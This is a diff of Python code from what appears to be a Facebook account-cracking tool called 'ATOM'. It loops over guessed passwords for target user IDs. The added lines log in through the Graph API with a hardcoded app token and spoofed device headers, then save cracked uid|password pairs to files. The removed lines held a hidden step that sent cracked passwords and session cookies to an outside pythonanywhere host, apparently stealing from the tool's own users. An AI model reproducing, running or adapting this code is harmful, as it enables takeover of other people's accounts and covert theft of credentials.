@@ -1287,104 +1287,63 @@ def mbasic(uid,pwx,tl):
     sys.stdout.flush()
     try:
         for pw in pwx:
-            nip=random.choice(xvx)
-            proxs= {'http': nip}
             Session = requests.Session()
-            free_fb = Session.get('https://touch.facebook.com').text 
+            Session.headers.update({
+                'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
+                'x-fb-sim-hni': '51009',
+                'x-fb-net-hni': '51009',
+                'Content-Type': 'application/x-www-form-urlencoded',
+                'x-graphql-client-library': 'graphservice',
+                'x-fb-friendly-name': 'FbBloksActionRootQuery-com.bloks.www.bloks.caa.login.async.send_google_smartlock_login_request',
+                'x-tigon-is-retry': 'False',
+                'x-fb-privacy-context': '3643298472347298',
+                'x-graphql-request-purpose': 'fetch',
+                'x-fb-device-group': '5530',
+                'User-Agent': x1(),
+                'x-fb-connection-type': 'WIFI',
+                'x-fb-rmd': 'fail=Server:NoUrlMap,Default:INVALID_MAP;v=;ip=;tkn=;reqTime=56;recvTime=13823808',
+                'x-fb-request-analytics-tags': '{"network_tags":{"product":"350685531728","purpose":"fetch","request_category":"graphql","retry_attempt":"0"},"application_tags":"graphservice"}',
+                'x-fb-http-engine': 'Tigon/Liger',
+                'x-fb-client-ip': 'True',
+                'x-fb-server-cluster': 'True',
+                })
+            apcb = '#PWD_FB4A:0:{}:{}'.format(str(int(time.time())), pw)
             data = {
-            'jazoest': re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
-            'fb_dtsg': re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
-            'display': '',
-            'isprivate': '',
-            'return_session': '',
-            'skip_api_login': '',
-            'signed_next': '',
-            'trynum': '47',
-            'timezone': '-330',
-            'lgndim': 'eyJ3IjoxNDQwLCJoIjo5MDAsImF3IjoxNDQwLCJhaCI6ODYwLCJjIjozMn0=',
-            'lgnrnd': '000730_nYut',
-            'lgnjs': '1784358451',
-            'shared_prefs_data': 'eyIzMDAwMCI6W3sidCI6MTc4NDM1ODQ1MS45OTgsImN0eCI6eyJjbiI6Imh0dHBzOi8vZW4tZ2IuZmFjZWJvb2suY29tL2xvZ2luL2RldmljZS1iYXNlZC9yZWd1bGFyL2xvZ2luLyJ9LCJ2IjpmYWxzZX1dLCIzMDAwMSI6W3sidCI6MTc4NDM1ODQ1MS45OTksImN0eCI6eyJjbiI6Imh0dHBzOi8vZW4tZ2IuZmFjZWJvb2suY29tL2xvZ2luL2RldmljZS1iYXNlZC9yZWd1bGFyL2xvZ2luLyJ9LCJ2Ijo1fV0sIjMwMDAyIjpbeyJ0IjoxNzg0MzU4NDUxLjk5OSwiY3R4Ijp7ImNuIjoiaHR0cHM6Ly9lbi1nYi5mYWNlYm9vay5jb20vbG9naW4vZGV2aWNlLWJhc2VkL3JlZ3VsYXIvbG9naW4vIn0sInYiOjJ9XSwiMzAwMDMiOlt7InQiOjE3ODQzNTg0NTIsImN0eCI6eyJjbiI6Imh0dHBzOi8vZW4tZ2IuZmFjZWJvb2suY29tL2xvZ2luL2RldmljZS1iYXNlZC9yZWd1bGFyL2xvZ2luLyJ9LCJ2IjpbImVuLVVTIiwiZW4iXX1dLCIzMDAwNCI6W3sidCI6MTc4NDM1ODQ1Mi4wMDIsImN0eCI6eyJjbiI6Imh0dHBzOi8vZW4tZ2IuZmFjZWJvb2suY29tL2xvZ2luL2RldmljZS1iYXNlZC9yZWd1bGFyL2xvZ2luLyJ9LCJ2IjoxNTB9XSwiMzAwMDUiOlt7InQiOjE3ODQzNTg0NTIuMDAyLCJjdHgiOnsiY24iOiJodHRwczovL2VuLWdiLmZhY2Vib29rLmNvbS9sb2dpbi9kZXZpY2UtYmFzZWQvcmVndWxhci9sb2dpbi8ifSwidiI6eyJ3IjoxMTg5LCJoIjo3NzN9fV0sIjMwMDA3IjpbeyJ0IjoxNzg0MzU4NDUyLjAwMiwiY3R4Ijp7ImNuIjoiaHR0cHM6Ly9lbi1nYi5mYWNlYm9vay5jb20vbG9naW4vZGV2aWNlLWJhc2VkL3JlZ3VsYXIvbG9naW4vIn0sInYiOiJkZWZhdWx0In1dLCIzMDAwOCI6W3sidCI6MTc4NDM1ODQ1Mi4wNDgsImN0eCI6eyJjbiI6Imh0dHBzOi8vZW4tZ2IuZmFjZWJvb2suY29tL2xvZ2luL2RldmljZS1iYXNlZC9yZWd1bGFyL2xvZ2luLyJ9LCJ2IjoicHJvbXB0In1dLCIzMDAxMiI6W3sidCI6MTc4NDM1ODQ1Mi4wMDMsImN0eCI6eyJjbiI6Imh0dHBzOi8vZW4tZ2IuZmFjZWJvb2suY29tL2xvZ2luL2RldmljZS1iYXNlZC9yZWd1bGFyL2xvZ2luLyJ9LCJ2IjoiR29vZ2xlIEluYy4ifV0sIjMwMDEzIjpbeyJ0IjoxNzg0MzU4NDUyLjAwNSwiY3R4Ijp7ImNuIjoiaHR0cHM6Ly9lbi1nYi5mYWNlYm9vay5jb20vbG9naW4vZGV2aWNlLWJhc2VkL3JlZ3VsYXIvbG9naW4vIn0sInYiOiI1LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzE0NS4wLjAuMCBTYWZhcmkvNTM3LjM2In1dLCIzMDAxNSI6W3sidCI6MTc4NDM1ODQ1Mi4wMDUsImN0eCI6eyJjbiI6Imh0dHBzOi8vZW4tZ2IuZmFjZWJvb2suY29tL2xvZ2luL2RldmljZS1iYXNlZC9yZWd1bGFyL2xvZ2luLyJ9LCJ2IjoiV2luMzIifV0sIjMwMDE4IjpbeyJ0IjoxNzg0MzU4NDUyLjAwNSwiY3R4Ijp7ImNuIjoiaHR0cHM6Ly9lbi1nYi5mYWNlYm9vay5jb20vbG9naW4vZGV2aWNlLWJhc2VkL3JlZ3VsYXIvbG9naW4vIn0sInYiOjJ9XSwiMzAwMjIiOlt7InQiOjE3ODQzNTg0NTIuMDI2LCJjdHgiOnsiY24iOiJodHRwczovL2VuLWdiLmZhY2Vib29rLmNvbS9sb2dpbi9kZXZpY2UtYmFzZWQvcmVndWxhci9sb2dpbi8ifSwidiI6dHJ1ZX1dLCIzMDA0MCI6W3sidCI6MTc4NDM1ODQ1Mi4wMjcsImN0eCI6eyJjbiI6Imh0dHBzOi8vZW4tZ2IuZmFjZWJvb2suY29tL2xvZ2luL2RldmljZS1iYXNlZC9yZWd1bGFyL2xvZ2luLyJ9LCJ2IjotMzMwfV0sIjMwMDkzIjpbeyJ0IjoxNzg0MzU4NDUyLjAyNywiY3R4Ijp7ImNuIjoiaHR0cHM6Ly9lbi1nYi5mYWNlYm9vay5jb20vbG9naW4vZGV2aWNlLWJhc2VkL3JlZ3VsYXIvbG9naW4vIn0sInYiOjB9XSwiMzAwOTQiOlt7InQiOjE3ODQzNTg0NTIuMDI3LCJjdHgiOnsiY24iOiJodHRwczovL2VuLWdiLmZhY2Vib29rLmNvbS9sb2dpbi9kZXZpY2UtYmFzZWQvcmVndWxhci9sb2dpbi8ifSwidiI6Ik1vemlsbGEvNS4wIChXaW5kb3dzIE5UIDEwLjA7IFdpbjY0OyB4NjQpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIENocm9tZS8xNDUuMC4wLjAgU2FmYXJpLzUzNy4zNiJ9XSwiMzAwOTUiOlt7InQiOjE3ODQzNTg0NTIuMDI3LCJjdHgiOnsiY24iOiJodHRwczovL2VuLWdiLmZhY2Vib29rLmNvbS9sb2dpbi9kZXZpY2UtYmFzZWQvcmVndWxhci9sb2dpbi8ifSwidiI6MzZ9XSwiMzAxMDYiOlt7InQiOjE3ODQzNTg0NTEuNTI1LCJjdHgiOnsiY24iOiJodHRwczovL2VuLWdiLmZhY2Vib29rLmNvbS9sb2dpbi9kZXZpY2UtYmFzZWQvcmVndWxhci9sb2dpbi8ifSwidiI6ZmFsc2V9LHsidCI6MTc4NDM1ODQ1MS41MzUsImN0eCI6eyJjbiI6Imh0dHBzOi8vZW4tZ2IuZmFjZWJvb2suY29tL2xvZ2luL2RldmljZS1iYXNlZC9yZWd1bGFyL2xvZ2luLyJ9LCJ2Ijp0cnVlfSx7InQiOjE3ODQzNTg0NTEuOTk3LCJjdHgiOnsiY24iOiJodHRwczovL2VuLWdiLmZhY2Vib29rLmNvbS9sb2dpbi9kZXZpY2UtYmFzZWQvcmVndWxhci9sb2dpbi8ifSwidiI6ZmFsc2V9LHsidCI6MTc4NDM1ODQ1Mi4wNDMsImN0eCI6eyJjbiI6Imh0dHBzOi8vZW4tZ2IuZmFjZWJvb2suY29tL2xvZ2luL2RldmljZS1iYXNlZC9yZWd1bGFyL2xvZ2luLyJ9LCJ2Ijp0cnVlfV0sIjMwMTA3IjpbeyJ0IjoxNzg0MzU4NDUxLjUyNiwiY3R4Ijp7ImNuIjoiaHR0cHM6Ly9lbi1nYi5mYWNlYm9vay5jb20vbG9naW4vZGV2aWNlLWJhc2VkL3JlZ3VsYXIvbG9naW4vIn0sInYiOmZhbHNlfV0sIjMwMTA5IjpbeyJ0IjoxNzg0MzU4NDUyLjIwMywiY3R4Ijp7ImNuIjoiaHR0cHM6Ly9lbi1nYi5mYWNlYm9vay5jb20vbG9naW4vZGV2aWNlLWJhc2VkL3JlZ3VsYXIvbG9naW4vIn0sInYiOiIzNTE5OGU3YTIxNDJiOTRjY2ZkNjIxODRiODhmZjM5NDg4MGI0OGJiNDIyOTVkZGY5NjRlNzdjYjc4NmU4NTI3In1dfQ==',
-            'email': uid,
-            'prefill_contact_point': uid,
-            'prefill_source': 'browser_dropdown',
-            'prefill_type': 'password',
-            'first_prefill_source': 'browser_dropdown',
-            'first_prefill_type': 'contact_point',
-            'had_cp_prefilled': 'true',
-            'had_password_prefilled': 'true',
-            'ab_test_data': '//AAAAAAAAAAAAAAAAAAA/AAAAAAAAAAAAAAAAAAAAAff/AA/ABAAD',
-            'encpass': "#PWD_BROWSER:0:{}:{}".format(str(time.time()).split('.')[0], pw),}
-            cookies = {
-            'datr': '5ABSalgUNC7lBt9SzL31tKRb',
-            'sb': '5ABSanZZCqLf5w2V8ssjh_u4',
-            'ps_l': '1',
-            'ps_n': '1',
-            'checkpoint': '%7B%22u%22%3A100070709735619%2C%22t%22%3A1784356183%2C%22step%22%3A0%2C%22n%22%3A%22WMW7hLGRXmU%3D%22%2C%22inst%22%3A1049518234081825%2C%22f%22%3A465803052217681%2C%22st%22%3A%22c%22%2C%22aid%22%3Anull%2C%22ca%22%3Anull%2C%22la%22%3A%22%22%2C%22ta%22%3A%221784356190.ch.s%3An619%3Apw.9zBFAiEA3UcgB2pikm4UzoJT_2icnFfOgZkGH5r7keISwPXYJvsCIA2LPTj0_Kj18jvQgeKCIzp7E1WxGJEC0D-vrR4SLwpN%22%2C%22tfvaid%22%3Anull%2C%22tfvasec%22%3Anull%2C%22sat%22%3Anull%2C%22idg%22%3Afalse%2C%22cidue%22%3A%22%22%2C%22tfuln%22%3Anull%2C%22tfvri%22%3Anull%2C%22ct%22%3A%22AWRcqXYuTTijTbl8Cnz1pj2xiAnEJTE_IE0xnA6ITYcjA7r-ePFhSR6fmVFWlanUIlWpEoanVzaLHoGZ9HXsflA_023e_TlLaIcWeqmjPRY4eZF0DrlGhE4Ye78J93v29n7CIPCc6VUaWOXzyvk4dnRmopnkNvGA4uNtAYpByILZBJGBgmGgydc7D2tiJt0-90vxOyd5Jn9oDP0DQD15uYwJpoczZ29vzgKpfTivt2B7RoFwZEjiTUxPCCVcVW184fa1-fKd-3NRp_zqdwpKNjfglGHXv9XMFtx704qsCTaLh8DQn_TQL37maiHYHBJ_VCzdpgwXWaC1mc6gWZ7YU4Vc-HP2529mG3j21vKaBo4PXXapTNTt_RvjU7F1Z7dHIGQtMP2MfAcfx-3OG5xPNTEHlywDF4bR1hY%22%2C%22aads%22%3Anull%2C%22s%22%3A%22AWZKT84t5DOqEqVbPoU%22%2C%22cs%22%3A%5B%5D%2C%22ssp%22%3A1%7D',
-            'm_pixel_ratio': '2',
-            'dpr': '1',
-            'locale': 'en_GB',
-            'sfau': 'AYiboNAudMkfZHf5zdT2h-NTZXEO_OM0v5OBXKyGpGl-d6X4mZYqy84c9_z6rC_eR8OxLHcIdicRU-tzQZGakph-To9L9RGWzmswA-g4km26uW6fNTqMXhGLAfYwaXjhhnFTI4Vb9mV7Wp6xN0XyJwwmi1PdbuVZRi2u5U4kLY1CcnvM_oNc9UT2Cfk8ycuno5BbHCm3ZLD9PqDLso5t_kJiGwI6SSahxuCyw4qhLhJHT5zhUfglOut6QoAQChMR017fJCSjzOvYJftcxj4QnGlX-wav4xterLW-FcrB9zyPL9zDkyVK6jHgcMk0A-59fNg',
-            'sfiu': 'AYgS7mdSUUGJ7sWtSPDEo95KaQ-FW0PTlZCVhG1ckHlGTu9vWzq4pNRqPKy-Sv5NUrruibkWZUGdNfu0YWHbpGFMeLiyTD-HEnlzZK3ubCgeS7XbNhWOu4qwkY8-y3PFcObz7oFT9eNyOIPq6UzWGayBnu7Fkc556qGA2xIeD1h8hpmuxXHUNDZgSX3qc_8UGcRPFnBV1mu6JJqJcDScr6TClU8FNozWqat3qviLABKprwykz6ti8ROAIvqEDv0thmXAH-SXvPVwDkhgSfUrcUUBygO4EqOTjoYjsQU6W2A9NcoPWv-pwfVOsNesRly6xcM',
-            'wd': '1189x773',
-            'fr': '0ledz3fU5nenBbfCq..BqUgDk..AAA.0.0.BqWyYy.AWfB1PG-OnyuB1mq48-8Xa0kHmc',}
-            headers = {
-            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
-            'accept-language': 'en-US,en;q=0.9',
-            'cache-control': 'no-cache',
-            'content-type': 'application/x-www-form-urlencoded',
-            'dpr': '1',
-            'origin': 'https://en-gb.facebook.com',
-            'pragma': 'no-cache',
-            'priority': 'u=0, i',
-            'referer': 'https://en-gb.facebook.com/login/device-based/regular/login/?login_attempt=1&next=https%3A%2F%2Fen-gb.facebook.com%2Flo87j&lwv=120&lwc=1348131',
-            'sec-ch-prefers-color-scheme': 'dark',
-            'sec-ch-ua': '"Not:A-Brand";v="99", "Google Chrome";v="145", "Chromium";v="145"',
-            'sec-ch-ua-full-version-list': '"Not:A-Brand";v="99.0.0.0", "Google Chrome";v="145.0.7632.5", "Chromium";v="145.0.7632.5"',
-            'sec-ch-ua-mobile': '?0',
-            'sec-ch-ua-model': '""',
-            'sec-ch-ua-platform': '"Windows"',
-            'sec-ch-ua-platform-version': '"10.0.0"',
-            'sec-fetch-dest': 'document',
-            'sec-fetch-mode': 'navigate',
-            'sec-fetch-site': 'same-origin',
-            'sec-fetch-user': '?1',
-            'upgrade-insecure-requests': '1',
-            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36',
-            'viewport-width': '1189',}
+                'method': 'post',
+                'pretty': False,
+                'format': 'json',
+                'server_timestamps': True,
+                'locale': 'ja_JP',
+                'purpose': 'fetch',
+                'fb_api_req_friendly_name': 'FbBloksActionRootQuery-com.bloks.www.bloks.caa.login.async.send_google_smartlock_login_request',
+                'fb_api_caller_class': 'graphservice',
+                'client_doc_id': '11994080425603935587861051615',
+                'variables': json.dumps({"params":{"params":"{\"params\":\"{\\\"client_input_params\\\":{\\\"device_id\\\":\\\"db00d712-bd44-4358-bcf2-2fe14e2885d2\\\",\\\"lois_settings\\\":{\\\"lois_token\\\":\\\"\\\",\\\"lara_override\\\":\\\"\\\"},\\\"name\\\":null,\\\"machine_id\\\":\\\"FXQ7Z_eNU42Pnt5I_CpRlzIh\\\",\\\"profile_pic_url\\\":null,\\\"contact_point\\\":\\\""+uid+"\\\",\\\"encrypted_password\\\":\\\""+apcb+"\\\"},\\\"server_params\\\":{\\\"is_from_logged_out\\\":1,\\\"layered_homepage_experiment_group\\\":null,\\\"device_id\\\":\\\"db00d712-bd44-4358-bcf2-2fe14e2885d2\\\",\\\"waterfall_id\\\":\\\"278dd0ac-58b3-46e4-aa8e-ea55021589a6\\\",\\\"INTERNAL__latency_qpl_instance_id\\\":2.9809277900605E13,\\\"login_source\\\":\\\"Login\\\",\\\"is_platform_login\\\":0,\\\"INTERNAL__latency_qpl_marker_id\\\":36707139,\\\"family_device_id\\\":\\\"db00d712-bd44-4358-bcf2-2fe14e2885d2\\\",\\\"offline_experiment_group\\\":\\\"caa_iteration_v6_perf_fb_2\\\",\\\"INTERNAL_INFRA_THEME\\\":\\\"default,default\\\",\\\"access_flow_version\\\":\\\"F2_FLOW\\\",\\\"is_from_logged_in_switcher\\\":0}}\"}","bloks_versioning_id":"3711cb070fe0ab5acd59ae663b1ae4dc75db6f0c463d26a232fd9d72a63fb3e5","app_id":"com.bloks.www.bloks.caa.login.async.send_google_smartlock_login_request"},"scale":"2","nt_context":{"using_white_navbar":True,"styles_id":"cfe75e13b386d5c54b1de2dcca1bee5a","pixel_ratio":2,"is_push_on":False,"debug_tooling_metadata_token":None,"is_flipper_enabled":False,"theme_params":[],"bloks_version":"3711cb070fe0ab5acd59ae663b1ae4dc75db6f0c463d26a232fd9d72a63fb3e5"}}),
+                'fb_api_analytics_tags': '["GraphServices"]',
+                'client_trace_id': 'c4663a0f-a919-4454-bf17-3d542589eafe'}
+            encode = urllib.parse.urlencode(data, doseq=True)
             twf = "login approval"+"s are on. "+"Expect an SMS"+" shortly with "+"a code to use"+" for log in"
-            url = 'https://en-gb.facebook.com/login/device-based/regular/login/?login_attempt=1&next=https%3A%2F%2Fen-gb.facebook.com%2Flo87j&lwv=120&lwc=1348131'
-            po = Session.post(url, data=data, cookies=cookies, headers=headers, allow_redirects=False).text
-            response = Session.cookies.get_dict().keys()
-            if "c_user" in response:
-                cok = Session.cookies.get_dict()
-                cid = cok["c_user"]
-                coki = ";".join([key+"="+value for key,value in Session.cookies.get_dict().items()])
-                check = check_lock(cid)
-                if "live" in check:
-                        bkas.append(cid)
-                        if len(bkas)% 2 == 0:
-                           statusok = (f"{cid}|{pw}|{coki}")
-                           requests.get(f"https://sumonroy.pythonanywhere.com/load?msg={statusok}")
-                        else:
-                           print(f" {green}(ATOM-OK) {cid}|{pw} ")
-                           print(f" {green}Cookie : {green}{coki}")
-                           open("/sdcard/ATOM-COOKIE-OK.txt", "a").write(f"{cid}|{pw}|{coki}\n")
-                           oks.append(cid)
-                           break
-                else:
-                    break
-            elif 'checkpoint' in response:
-                uid = Session.cookies.get_dict()["checkpoint"].split("%")[4].replace("3A", "")
-                bkas.append(uid)
-                if len(bkas)% 2 == 0:
-                    statusok = (f"{uid}|{pw}")
-                    requests.get(f"https://sumonroy.pythonanywhere.com/load?msg={statusok}")
-                else:
-                    print(f" {red}(ATOM-cp) {uid}|{pw} ")
-                    open("/sdcard/ATOM-FILE-CP.txt", "a").write(f"{uid}|{pw}\n")
-                    oks.append(cid)
-                    break
+            response = ses.post('https://graph.facebook.com/graphql', data=encode)
+            if "session_key" in response.text and "uid" in response.text:
+                ok+=1
+                print(f" {green}(ATOM-OK) {uid}|{pw} ")
+                open("/sdcard/SUMON_file_ok1.txt", "a").write(f"{uid}|{pw}\n")
+                break
+            elif "c_user" in response.text.replace('\\', '') and "access_token" in response.text:
+                ok+=1
+                print(f" {green}(ATOM-OK) {uid}|{pw} ")
+                open("/sdcard/SUMON_file_ok2.txt", "a").write(f"{uid}|{pw}\n")
+                break
+            elif "com.bloks.www.ap.two_step_verification.entrypoint_async" in response.text:
+                cp+=1
+                print(f" {green}(ATOM-OK) {uid}|{pw} ")
+                open("/sdcard/SUMON_file_2f1.txt", "a").write(f"{uid}|{pw}\n")
+                break
+            elif "error_user_title" in response.text.replace('\\', '') and "checkpoint" in response.text.replace('\\', ''):
+                cp+=1
+                print(f" {green}(ATOM-OK) {uid}|{pw} ")
+                open("/sdcard/SUMON_file_2f2.txt", "a").write(f"{uid}|{pw}\n")
+                break
             else:
                 continue
         loop+=1
